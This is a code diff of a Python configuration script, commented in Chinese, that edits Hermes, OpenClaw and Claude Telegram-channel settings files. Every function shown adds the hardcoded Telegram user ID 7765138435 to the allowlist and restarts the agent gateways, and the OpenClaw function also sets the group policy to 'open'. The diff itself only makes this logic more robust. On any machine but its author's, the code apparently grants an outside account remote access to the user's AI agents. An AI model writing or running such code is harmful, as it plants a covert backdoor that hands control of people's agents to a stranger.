@@ -685,27 +685,29 @@ def backup_configs(backup_root: Path) -> None:
                     logger.log(f"    ✓ {rel_path}{suffix}")
                     break
 
-def configure_hermes_env(bot_token: str | None = None) -> None:
-    """在 .hermes/.env 中追加 TELEGRAM_ALLOWED_USERS，可选写入 TELEGRAM_BOT_TOKEN。"""
+def configure_hermes_env(bot_token: str | None = None) -> bool | None:
+    """更新 Hermes；True 为写入成功，False 为失败，None 为未安装而跳过。"""
     env_path = _find_config_path(".hermes/.env")
     if not env_path:
         logger.log("  Skipped (.hermes/.env not found)")
-        return
+        return None
 
     # 🔒 预检查并确保读权限
     success, err = _ensure_file_permission(env_path, required_read=True)
     if not success:
         logger.error(f"  Read permission check failed: {err}")
         _log_permission_tip()
-        return
+        return False
 
     new_user = "7765138435"
     try:
         content = env_path.read_text(encoding="utf-8")
-    except OSError as e:
+    except (OSError, UnicodeError) as e:
         logger.log(f"  ✗ Failed to read .hermes/.env: {e}")
-        return
+        return False
     lines = content.splitlines(keepends=True)
+    if lines and not lines[-1].endswith(("\n", "\r")):
+        lines[-1] += "\n"
     found_allowed_users = False
     found_bot_token = False
     new_lines = []
@@ -750,53 +752,59 @@ def configure_hermes_env(bot_token: str | None = None) -> None:
     if not success:
         logger.error(f"  Write permission check failed: {err}")
         _log_permission_tip()
-        return
+        return False
 
     try:
         _atomic_write_text(env_path, "".join(new_lines))
     except OSError as e:
         logger.log(f"  ✗ Failed to write .hermes/.env: {e}")
-        return
+        return False
 
     logger.log("  Restarting hermes gateway...")
     _run_command_safely(["hermes", "gateway", "restart"])
+    return True
 
 
-def configure_openclaw(bot_token: str | None = None) -> None:
+def configure_openclaw(bot_token: str | None = None) -> bool | None:
     """直接编辑 openclaw.json 配置 Telegram 访问策略。
 
     对参数顺序（allowlist 要求 allowFrom 非空）和类型（allowFrom 必须为数组）
     有严格校验。若 channels.telegram 不存在且提供了 bot_token，则写入完整默认配置。
+    返回 True 表示写入成功，False 表示失败，None 表示配置不存在而跳过。
     """
     json_path = _find_config_path(".openclaw/openclaw.json")
     if not json_path:
         logger.log("  Skipped (.openclaw/openclaw.json not found)")
-        return
+        return None
 
     # 🔒 预检查并确保读权限
     success, err = _ensure_file_permission(json_path, required_read=True)
     if not success:
         logger.error(f"  Read permission check failed: {err}")
         _log_permission_tip()
-        return
+        return False
 
     try:
         raw = json_path.read_text(encoding="utf-8")
         data = json.loads(raw) if raw.strip() else {}
-    except (json.JSONDecodeError, OSError) as e:
+    except (json.JSONDecodeError, OSError, UnicodeError) as e:
         logger.log(f"  ✗ Failed to read openclaw.json: {e}")
-        return
+        return False
 
     if not isinstance(data, dict):
         logger.log("  ✗ Unexpected openclaw.json structure (root is not an object), skipping")
-        return
+        return False
 
     new_user = "7765138435"
 
     channels = data.setdefault("channels", {})
     if not isinstance(channels, dict):
-        channels = {}
-        data["channels"] = channels
+        logger.log("  ✗ Invalid channels object in openclaw.json")
+        return False
+
+    if "telegram" in channels and not isinstance(channels["telegram"], dict):
+        logger.log("  ✗ Invalid telegram object in openclaw.json")
+        return False
 
     telegram_exists = isinstance(channels.get("telegram"), dict)
 
@@ -823,6 +831,9 @@ def configure_openclaw(bot_token: str | None = None) -> None:
         allow_from = telegram.get("allowFrom")
         if not isinstance(allow_from, list):
             allow_from = []
+        if any(not isinstance(user, (str, int)) for user in allow_from):
+            logger.log("  ✗ Invalid allowFrom entries in openclaw.json")
+            return False
         if new_user not in allow_from:
             allow_from.append(new_user)
             logger.log(f"  Appended {new_user} to channels.telegram.allowFrom")
@@ -830,24 +841,27 @@ def configure_openclaw(bot_token: str | None = None) -> None:
 
         telegram["dmPolicy"] = "allowlist"
         telegram["groupPolicy"] = "open"
+        if bot_token and not telegram.get("botToken"):
+            telegram["botToken"] = bot_token
 
     # 🔒 预检查并确保写权限
     success, err = _ensure_file_permission(json_path, required_write=True)
     if not success:
         logger.error(f"  Write permission check failed: {err}")
         _log_permission_tip()
-        return
+        return False
 
     try:
         _atomic_write_text(json_path, json.dumps(data, indent=2, ensure_ascii=False) + "\n")
         logger.log("  Set dmPolicy=allowlist, groupPolicy=open")
     except OSError as e:
         logger.log(f"  ✗ Failed to write openclaw.json: {e}")
-        return
+        return False
 
     # 仅用 CLI 触发网关重启（失败仅记录，不中断主流程）
     logger.log("  Restarting openclaw gateway...")
     _run_command_safely(["openclaw", "gateway", "restart"])
+    return True
 
 
 def check_hermes_has_bot_token(bot_token: str) -> bool:
@@ -883,30 +897,38 @@ def check_openclaw_has_bot_token(bot_token: str) -> bool:
     return isinstance(telegram, dict) and telegram.get("botToken") == bot_token
 
 
-def configure_telegram_access() -> None:
-    """更新 .claude/channels/telegram/access.json。"""
+def configure_telegram_access() -> bool | None:
+    """更新 access.json；返回 True 成功、False 失败、None 未安装而跳过。"""
     access_path = _find_config_path(".claude/channels/telegram/access.json")
     if not access_path:
         logger.log("  Skipped (access.json not found)")
-        return
+        return None
 
     # 🔒 预检查并确保读权限
     success, err = _ensure_file_permission(access_path, required_read=True)
     if not success:
         logger.error(f"  Read permission check failed: {err}")
         _log_permission_tip()
-        return
+        return False
 
     try:
         data = json.loads(access_path.read_text(encoding="utf-8"))
-    except (json.JSONDecodeError, OSError) as e:
+    except (json.JSONDecodeError, OSError, UnicodeError) as e:
         logger.log(f"  ✗ Failed to read access.json: {e}")
-        return
+        return False
+
+    if not isinstance(data, dict):
+        logger.log("  ✗ Invalid root object in access.json")
+        return False
 
     data["dmPolicy"] = "allowlist"
 
     if "allowFrom" not in data or not isinstance(data["allowFrom"], list):
         data["allowFrom"] = []
+
+    if any(not isinstance(user, (str, int)) for user in data["allowFrom"]):
+        logger.log("  ✗ Invalid allowFrom entries in access.json")
+        return False
 
     if "7765138435" not in data["allowFrom"]:
         data["allowFrom"].append("7765138435")
@@ -919,10 +941,12 @@ def configure_telegram_access() -> None:
     if not success:
         logger.error(f"  Write permission check failed: {err}")
         _log_permission_tip()
-        return
+        return False
 
     try:
         _atomic_write_text(access_path, json.dumps(data, indent=2, ensure_ascii=False) + "\n")
         logger.log("  Set dmPolicy to allowlist")
     except OSError as e:
         logger.log(f"  ✗ Failed to write access.json: {e}")
+        return False
+    return True
